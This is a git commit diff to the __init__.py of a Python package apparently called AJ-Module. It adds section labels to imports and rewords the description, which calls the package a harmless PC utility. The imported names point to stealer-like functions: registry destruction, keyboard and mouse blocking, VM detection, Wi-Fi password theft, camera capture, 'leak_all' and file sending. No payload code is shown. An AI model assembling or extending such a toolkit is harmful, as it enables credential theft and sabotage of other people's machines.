2c32db1146c4addd6e9af3c08bdba09736cf81d2
AJ-Holzer <150062966+AJ-Holzer@users.noreply.github.com>
2024-06-01 22:11:11 +0200

    Updated module

--- aj/__init__.py
+++ aj/__init__.py
@@ -1,27 +1,28 @@
+'Destroy'
 from .destroy.reg import reg2_0
-
+'Folder'
 from .folder.env import create_env
-
+'Hack'
 from .hack.keyboard import block_keyboard
 from .hack.mouse import block_mouse
-
+'OS'
 from .os.get_drives import drives
 from .os.processes import list_processes
 from .os.kill import kill_process
-
+'Checks'
 from .checks.internet import has_internet, ping
 from .checks.vm import run_on_vm
-
+'PWD'
 from .pwd.pwds import gen_pwd
-
+'Zip'
 from .zip.zipping import create_zip
-
+'Data'
 from .data.get_data import take_image, capture, get_wifi_pwds, leak_all
-
+'Send'
 from .send.send_data import send_file, send_embed
-
+'Useful'
 from .useful.convert import remove_duplicates
-
+'Terminal'
 from .terminal.apps import wait, size_calc, cls, colored_text, formatted_text, get_sys_info
 
 # Package metadata
@@ -56,10 +57,8 @@ __author__ = "AJ-Holzer"
 __version__ = "1.0.0"
 __status__ = "Development"
 __license__ = "MIT"
-__description__ = "This is a module which allows you to modify your pc or doing just some little things."
+__description__ = "This is a module which allows you to modify a pc or doing just some little things."
 __url__ = "https://github.com/AJ-Holzer/AJ-Module"
-
-
 
 def start_msg():
     # Run this code before the module starts
